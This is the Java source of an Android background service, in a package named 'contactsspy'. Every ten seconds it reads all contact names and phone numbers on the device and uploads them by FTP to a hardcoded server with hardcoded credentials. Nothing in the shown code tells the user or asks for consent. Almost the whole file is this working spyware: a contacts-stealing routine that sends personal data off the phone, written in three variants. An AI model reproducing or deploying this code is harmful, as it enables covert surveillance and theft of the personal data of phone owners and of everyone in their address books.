package com.example.contactsspy;

import android.Manifest;
import android.app.Notification;
import android.app.Service;
import android.content.ContentResolver;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.IBinder;
import android.provider.ContactsContract;
import android.util.Log;
import android.widget.Toast;

import androidx.core.app.NotificationCompat;

import org.apache.commons.net.ftp.FTPClient;
import org.apache.commons.net.ftp.FTPCmd;
import org.apache.commons.net.ftp.FTP;

import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.util.ArrayList;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;
import java.io.*;
public class MainService extends Service {
    Timer timer = new Timer();
    int cntLog = 0;
    MyTimerTask myTimerTask = new MyTimerTask();



    @Override
    public void onCreate() {
        super.onCreate();
        Log.d("myLogs", "Service onCreate");
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {

        Log.d("myLogs", "Service Started");
        timer.schedule(myTimerTask, 5000, 10000);
        return START_REDELIVER_INTENT ;
        //return super.onStartCommand(intent, flags, startId);
    }

    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        throw new UnsupportedOperationException("Not yet implemented");
    }

    @Override
    public void onDestroy() {

        Log.d("myLogs", "Service destroyed!");
        timer.cancel();
        timer.purge();
    }


    private class MyTimerTask extends TimerTask {

        final String TAG = "myLogs";

        final String IP_ADDR = "192.168.88.10";
        final String USER_NAME = "ftpuser2";
        final String USER_PASSWORD = "123";

        @Override
        public void run() {
            Log.d("myLogs", "runCAll");
            try {
                SendToServer();
            } catch (IOException e) {
                e.printStackTrace();
                Log.d("myLogs", "SendToServer catch");
            }
        }


        private void SendToServer() throws IOException {

            File tempFile;
            tempFile = File.createTempFile("tempfile", ".txt", getCacheDir());
            OutputStream out = getContentResolver().openOutputStream(Uri.fromFile(tempFile));

            ArrayList<ContactInfo> contactInfoArrayList = getContactList();
            ArrayList<String> resultKont = new ArrayList<String>();
            String tempStr = new String();
            try {
                for (ContactInfo contactInfo : contactInfoArrayList){
                    StringBuilder sb = new StringBuilder();
                    sb.append("---------------------------------\n");
                    sb.append("Contact name: " + contactInfo.name + "\n");
                    sb.append("Numbers:");
                    tempStr+="---------------------------------\n";
                    tempStr +="Contact name: " + contactInfo.name + "\n";
                    tempStr +="Numbers:";
                    //String info = "Contact name: " + contactInfo.name + "with numbers: ";
                    //for(String number : contactInfo.numbers)
                    //info.append("\t\t" + number + "\n");
                    boolean first_number = true;
                    for(String number : contactInfo.numbers)
                    {
                        if (first_number)
                        {
                            first_number = false;
                            sb.append("      " + number + "\n");
                            tempStr+="      " + number + "\n";
                        }
                        else {
                            sb.append("\t      " + number + "\n");
                            tempStr+="\t      " + number + "\n";
                        }
                    }
                    resultKont.add(tempStr);
                    //tempStr = "";
                    sb.append("\n");
                    out.write(sb.toString().getBytes());
                    //Log.d(TAG, sb.toString());
                }
                //out.write("kek".getBytes());
                out.close();

            } catch (IOException e) {
                Log.d(TAG,"writing file catch");
            }
            FTPClient ftp = new FTPClient();
            FTPModel mymodel = new FTPModel();
            //boolean co = mymodel.connect(IP_ADDR, USER_NAME, USER_PASSWORD, 21, getApplicationContext(), tempFile);
            //boolean co = mymodel.connect(IP_ADDR,21);
            ftp.connect(IP_ADDR);
            ftp.setFileTransferMode(FTP.BINARY_FILE_TYPE);
            ftp.enterLocalPassiveMode();
            ftp.setControlKeepAliveTimeout(5000);
            boolean status = ftp.login(USER_NAME,USER_PASSWORD);
            if (status){
                Log.d(TAG,"connect");
                //OutputStream os = new BufferedOutputStream(new FileOutputStream(tempFile));
                //BufferedInputStream is = new BufferedInputStream(new InputStream(tempFile.getName()));
               // for (String it: resultKont) {
                    ByteArrayInputStream is = new ByteArrayInputStream(tempStr.getBytes());
                    ftp.sendCommand(FTPCmd.CHANGE_WORKING_DIRECTORY, "files");
                    Log.d(TAG, ftp.getReplyString());
                    //String targetFname = "log.file"
                    if (ftp.storeFile(new String("log.file".getBytes("ms932"), "ISO-8859-1"), is))
                        Log.d(TAG, "pass");

                //}
                //Log.d(TAG, it);
                tempStr = "";
                resultKont.clear();
                Log.d(TAG, "wtfwtfwtf");
                Log.d(TAG, ftp.getReplyString());

                ftp.logout();
                ftp.disconnect();
                Log.d(TAG, "k");

            }
            else {
                resultKont.clear();
                Log.d(TAG,"no connect");
            }
//            if(co)
//            {
//                Log.d(TAG,"connect");
//                Log.d(TAG,"connect");
//            }
//            else{
//                Log.d(TAG,"no connect");
//            }
        }

        private void SendToServer2() throws IOException {

            File tempFile;
            tempFile = File.createTempFile("tempfile", ".txt", getCacheDir());
            OutputStream out = getContentResolver().openOutputStream(Uri.fromFile(tempFile));

            ArrayList<ContactInfo> contactInfoArrayList = getContactList();
            final String HEAD_SEPARATOR = "";
            try {
                //find max lenght
                int max_lenght = 0;
                for (ContactInfo contactInfo : contactInfoArrayList)
                {
                    if(contactInfo.name.length() > max_lenght)
                        max_lenght = contactInfo.name.length();
                    for(String number : contactInfo.numbers)
                    {
                        if(number.length() > max_lenght)
                            max_lenght = number.length();
                    }
                };
                Log.d(TAG,"@ 2 verison");
                StringBuilder stringBuilderHead = new StringBuilder();
                StringBuilder stringBuilderTemphead = new StringBuilder();
                stringBuilderTemphead.append("|");
                stringBuilderHead.append("|");
                Log.d(TAG,"max lenght size = " + max_lenght);
                max_lenght += (14 + 2);
                for (int i = 0; i < max_lenght; i++){
                    stringBuilderHead.append('_');
                    stringBuilderTemphead.append("_");
                };
                stringBuilderHead.append("|");
                stringBuilderTemphead.append("|");

                String formatHead = stringBuilderHead.toString();
                String formatHeadTemp = stringBuilderTemphead.toString();
                Log.d(TAG,formatHead);
                for (ContactInfo contactInfo : contactInfoArrayList){
                    StringBuilder sb = new StringBuilder();
                    sb.append(formatHead + "\n");
                    String nameData = "| Contact name: " + contactInfo.name;
                    sb.append(nameData);
                    SBHelper(sb, " ", max_lenght - nameData.length() + 1);
                    sb.append(formatHeadTemp+"\n");

                    boolean first_number = true;
                    for(String number : contactInfo.numbers)
                    {
                        if (first_number)
                        {
                            String numbersFirst = "| Numbers:";
                            first_number = false;
                            numbersFirst = numbersFirst + "      " + number;
                            sb.append(numbersFirst);
                            SBHelper(sb, " ", max_lenght - numbersFirst.length() + 1);
                        }
                        else {
                            String numbers = "|\t\t";
                            Log.d(TAG, " size = " + numbers.length());
                            numbers = "|\t\t" + number;
                            sb.append(numbers);
                            SBHelper(sb, " ", max_lenght - (numbers.length() + 13) + 1);
                        }

                    }
                    out.write(sb.toString().getBytes());
                    //Log.d(TAG, sb.toString());
                }
                //out.write("kek".getBytes());
                out.close();

            } catch (IOException e) {
                Log.d(TAG,"writing file catch");
            }

            FTPModel mymodel = new FTPModel();
            boolean co = mymodel.connect(IP_ADDR, USER_NAME, USER_PASSWORD, 21, getApplicationContext(), tempFile);
            if(co)
            {
                Log.d(TAG,"connect");
            }
            else{
                Log.d(TAG,"no connect");
            }
        }

        private void SendToServer3() throws IOException {

            File tempFile;
            tempFile = File.createTempFile("tempfile", ".txt", getCacheDir());
            OutputStream out = getContentResolver().openOutputStream(Uri.fromFile(tempFile));

            ArrayList<ContactInfo> contactInfoArrayList = getContactList();
            try {
                //find max lenght
                int max_lenght = 0;
                for (ContactInfo contactInfo : contactInfoArrayList)
                {
                    if(contactInfo.name.length() > max_lenght)
                        max_lenght = contactInfo.name.length();
                    for(String number : contactInfo.numbers)
                    {
                        if(number.length() > max_lenght)
                            max_lenght = number.length();
                    }
                };
                max_lenght += (14 + 2);
                StringBuilder sbHead = new StringBuilder();
                for (int i = 0; i < max_lenght+2; i++)
                    sbHead.append("_");
                sbHead.append("\n");
                String formatSubHead = "|______________|";

                String formatHeadClean = sbHead.toString();
                boolean first_loop = true;
                for (ContactInfo contactInfo : contactInfoArrayList){
                    StringBuilder sb = new StringBuilder();
                    sb.append(formatHeadClean);
                    String nameData = "| Contact name | " + contactInfo.name;
                    sb.append(nameData);
                    SBHelper(sb, " ", max_lenght - nameData.length()+1);
                    sb.append(formatSubHead);
                    SBHelper(sb, "_", max_lenght - formatSubHead.length()+1);

                    boolean first_number = true;
                    for(String number : contactInfo.numbers)
                    {
                        if (first_number)
                        {
                            String numbersFirst = "| Numbers:";
                            first_number = false;
                            numbersFirst = numbersFirst + "     | " + number;
                            sb.append(numbersFirst);
                            SBHelper(sb, " ", max_lenght - numbersFirst.length() + 1);
                        }
                        else {
                            String numbers;
                            //numbers = "|\t\t" + number;
                            numbers = "|              | " + number;
                            sb.append(numbers);
                            SBHelper(sb, " ", max_lenght - numbers.length() + 1);
                        }

                    }//*/

                    sb.append(formatSubHead);
                    SBHelper(sb, "_", max_lenght - formatSubHead.length()+1);
                    out.write(sb.toString().getBytes());
                    //Log.d(TAG, sb.toString());
                }
                //out.write("kek".getBytes());
                out.close();

            } catch (IOException e) {
                Log.d(TAG,"writing file catch");
            }

            FTPModel mymodel = new FTPModel();
            boolean co = mymodel.connect(IP_ADDR, USER_NAME, USER_PASSWORD, 21, getApplicationContext(), tempFile);
            if(co)
            {
                Log.d(TAG,"connect");
            }
            else{
                Log.d(TAG,"no connect");
            }
        }


        private void SBHelper(StringBuilder sb, String character, int count)
        {
            for (int i = 0; i < count; i++)
                sb.append(character);
            sb.append("|\n");

        }

        private ArrayList<ContactInfo> getContactList() {
            ArrayList<ContactInfo> contacts = new ArrayList<ContactInfo>();
            ContentResolver contentResolver = getContentResolver();
            Cursor cursor = contentResolver.query(ContactsContract.Contacts.CONTENT_URI,
                    null, null, null, null);

            if (cursor != null) {
                if (cursor.getCount() > 0) {
                    while (cursor.moveToNext()){
                        ContactInfo contactInfo = new ContactInfo(
                                cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME))
                        );
                        if(cursor.getInt(cursor.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0){
                            Cursor numberCursor = contentResolver.query(
                                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                                    null,
                                    ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                                    new String[]{cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID))},
                                    null
                            );
                            ArrayList<String> numbers = new ArrayList<String>();
                            while(numberCursor.moveToNext()){
                                numbers.add(numberCursor.getString(numberCursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)));
                            };
                            contactInfo.numbers = numbers;
                            contacts.add(contactInfo);
                            numberCursor.close();

                        }
                    }
                }
            }
            return contacts;
        };

    }
}
